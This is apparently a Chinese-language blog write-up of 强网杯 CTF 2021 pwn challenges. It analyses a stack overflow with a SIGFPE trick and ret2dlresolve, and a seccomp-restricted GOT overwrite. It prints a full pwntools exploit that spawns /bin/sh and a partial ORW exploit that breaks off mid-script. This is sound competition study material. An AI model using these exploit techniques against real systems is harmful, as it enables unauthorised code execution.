<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="no_output123456test: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux.so.2, BuildID[sha1]&#x3D;42055570bc1508252eacc21b95b83f8c002483eb, for GNU&#x2F;Linux">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯CTF2021">
<meta property="og:url" content="http://example.com/2023/07/03/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF2021/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="no_output123456test: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux.so.2, BuildID[sha1]&#x3D;42055570bc1508252eacc21b95b83f8c002483eb, for GNU&#x2F;Linux">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-07-03T09:03:05.000Z">
<meta property="article:modified_time" content="2023-07-03T09:07:22.000Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="off-by-one">
<meta property="article:tag" content="ORW">
<meta property="article:tag" content="shellcode">
<meta property="article:tag" content="exit_hook">
<meta property="article:tag" content="ret2dlresolve">
<meta property="article:tag" content="musl">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2023/07/03/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF2021/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>强网杯CTF2021 | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/03/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF2021/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          强网杯CTF2021
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-07-03 17:03:05 / Modified: 17:07:22" itemprop="dateCreated datePublished" datetime="2023-07-03T17:03:05+08:00">2023-07-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>46k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>41 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="no-output"><a href="#no-output" class="headerlink" title="no_output"></a>no_output</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=<span class="number">42055570b</span>c1508252eacc21b95b83f8c002483eb, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>32位，dynamically，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>简单栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read_s</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);                  <span class="comment">// 栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>strcpy 会将字符串末尾置空，导致 fdg 被设置为“0”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(nameg, name);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用 strcpy 的溢出覆盖 fdg 为“0”，通过第二次输入绕过程序的字符串匹配检查</p>
<p>接着就要考虑如何触发浮点异常信号 SIGFPE：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="string">&quot;give me the soul:&quot;</span>;</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, soul);</span><br><span class="line">v2 = <span class="string">&quot;give me the egg:&quot;</span>;</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;egg);</span><br><span class="line"><span class="keyword">if</span> ( egg )</span><br><span class="line">&#123;</span><br><span class="line">  signal(<span class="number">8</span>, (<span class="keyword">__sighandler_t</span>)read_s);</span><br><span class="line">  soul[<span class="number">1</span>] = soul[<span class="number">0</span>] / egg;</span><br><span class="line">  signal(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于除号两边都是 int 类型，因此 <code>-0x80000000/-1</code> 就会触发漏洞（<code>-0x80000000/-1</code> 的计算结果为 <code>0x80000000</code>，其值为负数，导致符号位溢出）</p>
<p>由于没法泄露，因此只能打 ret2dlresolve</p>
<p>对于32位无 PIE 保护的程序，在 pwntools 中有比较成熟的 ret2dlresolve 工具，直接拿来用就好了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&#x27;./test&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x8049268&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sl(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;hello_boy&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;-2147483648&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804C080</span>+<span class="number">0x200</span></span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"></span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">sl(flat([&#123;<span class="number">76</span>:raw_rop&#125;]))</span><br><span class="line">sl(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>)</span> stable release version 2.23, by Roland McGrath et al.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">02</span>a3c09af5900983d07486d2b3310dffcebfde86, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，Canary，PIE</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>白名单，只能打 ORW</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>index 缺乏检查，导致 chunk_list 可以向上溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chunk_list[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>程序的限制比较多：</p>
<ul>
<li>add 可以执行2次，dele 可以执行1次</li>
<li>每次输入的 size 大小不超过8字节，index 大小不超过1（可以为负数）</li>
</ul>
<p>由于 index 可以为负数，可以尝试向上溢出，能够劫持的地方只有两处：GOT，IO_FILE</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">98</span>:<span class="number">04</span>c0│  <span class="number">0x564531002060</span> (<span class="built_in">malloc</span>@got.plt) —▸ <span class="number">0x7fa488599180</span> (<span class="built_in">malloc</span>) ◂— push   rbp</span><br><span class="line"><span class="number">99</span>:<span class="number">04</span>c8│  <span class="number">0x564531002068</span> (setvbuf@got.plt) —▸ <span class="number">0x7fa488584e80</span> (setvbuf) ◂— push   rbp</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a2:<span class="number">0510</span>│  <span class="number">0x5645310020b0</span> —▸ <span class="number">0x7fa4888d98e0</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line">a3:<span class="number">0518</span>│  <span class="number">0x5645310020b8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>往 GOT 写入堆地址似乎没有什么用，劫持 IO_FILE 的话输入的字节数又太少</p>
<p>后来突然意识到一点：写入 GOT 的堆中数据可能会被执行（没有 NX），有些 wp 上也是利用这一点进行入侵</p>
<p>但经测试发现这些数据没有执行权限，vmmap 打印的 heap 段也没有显示x权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap <span class="number">0x555555605160</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555605000</span>     <span class="number">0x555555626000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap] +<span class="number">0x160</span></span><br></pre></td></tr></table></figure>
<p>一番查找后得知：某些旧版本的操作系统可能不支持或不启用NX位，在这种情况下，即使关闭了NX位，堆仍然不会具有执行权限</p>
<p>接下来的思路就简单了，往 GOT 写入并执行8字节的指令，共有2次机会</p>
<p>其中最适合写指令的 GOT 表条目就是 <code>atoi got</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readn(nptr, <span class="number">16LL</span>);</span><br><span class="line"><span class="keyword">return</span> atoi(nptr);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x555555400e29</span>    call   atoi@plt                &lt;atoi@plt&gt;</span><br><span class="line">       nptr: <span class="number">0x7fffffffdc20</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>因为栈也是有执行权限的，如果在 <code>atoi got</code> 中写入 <code>jmp rdi</code> 就可以劫持控制流到栈上，然后执行一个 sys_read 就可以写入 ORW 的 shellcode</p>
<p>由于 heap 权限的问题没有解决，我这里只能参考网上的 exp 大概写一下</p>
<p>非完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        